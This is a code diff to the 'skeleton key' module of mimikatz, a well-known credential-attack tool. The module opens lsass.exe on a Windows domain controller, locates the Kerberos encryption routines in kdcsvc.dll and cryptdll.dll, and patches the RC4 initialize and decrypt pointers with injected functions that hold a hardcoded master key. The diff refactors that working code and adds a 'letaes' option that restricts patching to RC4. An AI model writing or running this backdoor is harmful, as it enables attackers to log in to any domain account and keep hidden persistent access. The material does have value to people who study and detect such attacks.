@@ -591,9 +591,9 @@ typedef HLOCAL	(WINAPI * PLOCALFREE) (__deref HLOCAL hMem);
 #pragma optimize("", off)
 NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD KeyUsage, PVOID * pContext)
 {
-	NTSTATUS status = 0xC000009A;
+	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
 	PVOID origContext, kiwiContext;
-	BYTE kiwiKey[] = {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6};
+	DWORD kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
 	if(*pContext = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, 32 + sizeof(PVOID)))
 	{
 		status = ((PKERB_ECRYPT_INITIALIZE) 0x4343434343434343)(Key, KeySize, KeyUsage, &origContext);
@@ -604,9 +604,9 @@ NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD Ke
 			if(NT_SUCCESS(status))
 			{
 				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) *pContext + 16, kiwiContext, 16);
-				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) *pContext + 32, &Key, sizeof(PVOID));
 				((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(kiwiContext);
 			}
+			*(LPCVOID *) ((PBYTE) *pContext + 32) = Key;
 			((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(origContext);
 		}
 		if(!NT_SUCCESS(status))
@@ -619,9 +619,8 @@ NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init(LPCVOID Key, DWORD KeySize, DWORD Ke
 }
 NTSTATUS WINAPI kuhl_misc_skeleton_rc4_init_decrypt(PVOID pContext, LPCVOID Data, DWORD DataSize, PVOID Output, DWORD * OutputSize)
 {
-	NTSTATUS status = 0xC000009A;
-	DWORD origOutputSize = *OutputSize;
-	BYTE kiwiKey[] = {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6};
+	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
+	DWORD origOutputSize = *OutputSize, kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
 	PVOID buffer;
 	if(buffer = ((PLOCALALLOC) 0x4a4a4a4a4a4a4a4a)(0, DataSize))
 	{
@@ -662,7 +661,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 		{NULL,				NULL,			(PVOID) 0x4444444444444444, NULL}, // Decrypt
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
-
+	BOOL onlyRC4Stuff = (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
 	RtlZeroMemory(&orig, sizeof(orig));
 	RtlInitUnicodeString(&orig, newerKey);
 	if(kull_m_process_getProcessIdForName(L"lsass.exe", &processId))
@@ -671,7 +670,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 		{
 			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aLsass.hMemory))
 			{
-				if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
+				if(!onlyRC4Stuff)
 				{
 					if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"kdcsvc.dll", &cryptInfos))
 					{
@@ -689,9 +688,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 								RtlZeroMemory(&orig, sizeof(orig));
 								aLsass.address = sMemory.result;
 								if(success = kull_m_memory_copy(&aLsass, &aLocal, sizeof(orig)))
-								{
 									kprintf(L"[KDC] keys patch OK\n");
-								}
 							}
 							else PRINT_ERROR(L"Second pattern not found\n");
 						}
@@ -700,7 +697,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
 				}
 
-				if(success || (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA))
+				if(success || onlyRC4Stuff)
 				{
 					if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"cryptdll.dll", &cryptInfos))
 					{
@@ -717,11 +714,11 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 								aLsass.address = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt - localAddr) + FIELD_OFFSET(KERB_ECRYPT, Initialize);
 								if(kull_m_memory_copy(&aLsass, &aLocal, sizeof(PVOID)))
 								{
-									kprintf(L"[RC4] init patch OK\n", aLsass.address);
+									kprintf(L"[RC4] init patch OK\n");
 									ptrValue += (PBYTE) kuhl_misc_skeleton_rc4_init_decrypt - (PBYTE) kuhl_misc_skeleton_rc4_init;
 									aLsass.address = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt - localAddr) + FIELD_OFFSET(KERB_ECRYPT, Decrypt);
 									if(kull_m_memory_copy(&aLsass, &aLocal, sizeof(PVOID)))
-										kprintf(L"[RC4] decrypt patch OK\n", aLsass.address);
+										kprintf(L"[RC4] decrypt patch OK\n");
 								}
 							}
 							else PRINT_ERROR(L"Unable to create remote functions\n");
